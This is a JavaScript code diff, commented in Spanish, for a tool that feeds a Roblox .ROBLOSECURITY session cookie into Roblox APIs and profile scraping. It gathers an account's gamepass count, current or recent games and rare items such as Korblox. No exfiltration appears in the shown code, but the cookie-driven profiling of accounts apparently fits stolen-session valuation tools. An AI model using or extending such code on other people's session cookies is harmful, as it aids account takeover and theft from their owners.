@@ -287,6 +287,119 @@ async function obtenerNombrePais(codigo) {
     }
 }
 
+// Obtener juegos creados (para gamepasses)
+async function obtenerJuegosCreados(userId, cookie) {
+    try {
+        const res = await fetch(\`https://games.roblox.com/v2/users/\${userId}/games?limit=50\`, {
+            headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
+        });
+        if (!res.ok) return [];
+        const data = await res.json();
+        return data.data || [];
+    } catch {
+        return [];
+    }
+}
+
+// Obtener gamepasses de un juego específico
+async function obtenerGamePassesDeJuego(universeId, cookie) {
+    try {
+        const res = await fetch(\`https://games.roblox.com/v1/games/\${universeId}/game-passes?limit=100\`, {
+            headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
+        });
+        if (!res.ok) return [];
+        const data = await res.json();
+        return data.data || [];
+    } catch {
+        return [];
+    }
+}
+
+// Contar gamepasses totales
+async function obtenerGamePasses(userId, cookie) {
+    try {
+        const juegos = await obtenerJuegosCreados(userId, cookie);
+        let total = 0;
+        for (const juego of juegos) {
+            const gamepasses = await obtenerGamePassesDeJuego(juego.id, cookie);
+            total += gamepasses.length;
+            // Pequeña pausa para no rate-limit
+            await new Promise(r => setTimeout(r, 100));
+        }
+        return total;
+    } catch {
+        return 0;
+    }
+}
+
+// Obtener últimos juegos jugados (scraping del perfil + Presence API)
+async function obtenerUltimosJuegos(userId, cookie) {
+    const juegos = [];
+    
+    try {
+        // 1. Intentar con Presence API (juego actual)
+        const presenceRes = await fetch('https://presence.roblox.com/v1/presence/users', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Cookie': \`.ROBLOSECURITY=\${cookie};\`
+            },
+            body: JSON.stringify({ "userIds": [userId] })
+        });
+        
+        if (presenceRes.ok) {
+            const presenceData = await presenceRes.json();
+            if (presenceData.userPresences && presenceData.userPresences.length > 0) {
+                const presence = presenceData.userPresences[0];
+                // userPresenceType: 0 = Offline, 1 = Online, 2 = InGame, 3 = Studio
+                if (presence.userPresenceType === 2 && presence.universeId) {
+                    const gameRes = await fetch(\`https://games.roblox.com/v1/games?universeIds=\${presence.universeId}\`);
+                    if (gameRes.ok) {
+                        const gameData = await gameRes.json();
+                        if (gameData.data && gameData.data.length > 0) {
+                            juegos.push(gameData.data[0].name);
+                        } else {
+                            juegos.push(\`Juego ID: \${presence.universeId}\`);
+                        }
+                    } else {
+                        juegos.push(\`Juego ID: \${presence.universeId}\`);
+                    }
+                }
+            }
+        }
+    } catch (e) {
+        console.log("Presence API error:", e);
+    }
+
+    // 2. Si no se obtuvo juego actual, hacer scraping del perfil
+    if (juegos.length === 0) {
+        try {
+            const profileRes = await fetch(\`https://www.roblox.com/users/\${userId}/profile\`, {
+                headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
+            });
+            if (profileRes.ok) {
+                const html = await profileRes.text();
+                // Buscar la sección de juegos recientes en el HTML
+                // Patrón típico: <span class="game-name">Nombre del juego</span>
+                const gameRegex = /<span class="game-name">([^<]+)<\\/span>/g;
+                let match;
+                while ((match = gameRegex.exec(html)) !== null && juegos.length < 3) {
+                    juegos.push(match[1]);
+                }
+            }
+        } catch (e) {
+            console.log("Scraping error:", e);
+        }
+    }
+
+    // Rellenar con placeholders si no hay suficientes
+    while (juegos.length < 3) {
+        juegos.push('No disponible');
+    }
+    
+    return juegos;
+}
+
 async function tieneItem(userId, cookie, assetId) {
     try {
         const res = await fetch(\`https://inventory.roblox.com/v1/users/\${userId}/items/Asset/\${assetId}\`, {
@@ -296,32 +409,6 @@ async function tieneItem(userId, cookie, assetId) {
         return data.data && data.data.length > 0;
     } catch {
         return false;
-    }
-}
-
-async function obtenerGamePasses(userId, cookie) {
-    try {
-        const res = await fetch(\`https://games.roblox.com/v2/users/\${userId}/games?limit=10\`, {
-            headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
-        });
-        if (!res.ok) return 0;
-        const data = await res.json();
-        return data.data?.filter(g => g.gamePasses?.length > 0)?.length || 0;
-    } catch {
-        return 0;
-    }
-}
-
-async function obtenerUltimosJuegos(userId, cookie) {
-    try {
-        const res = await fetch(\`https://games.roblox.com/v2/users/\${userId}/games?limit=3\`, {
-            headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
-        });
-        if (!res.ok) return ['No disponible', '', ''];
-        const data = await res.json();
-        return data.data?.map(g => g.name) || ['No disponible', '', ''];
-    } catch {
-        return ['No disponible', '', ''];
     }
 }
 
@@ -390,8 +477,8 @@ async function obtenerInfoRoblox(cookie) {
             korblox: korblox ? 'Sí' : 'No',
             gamepasses: gamepasses,
             juego1: juegos[0] || 'No disponible',
-            juego2: juegos[1] || '',
-            juego3: juegos[2] || ''
+            juego2: juegos[1] || 'No disponible',
+            juego3: juegos[2] || 'No disponible'
         };
     } catch {
         return null;
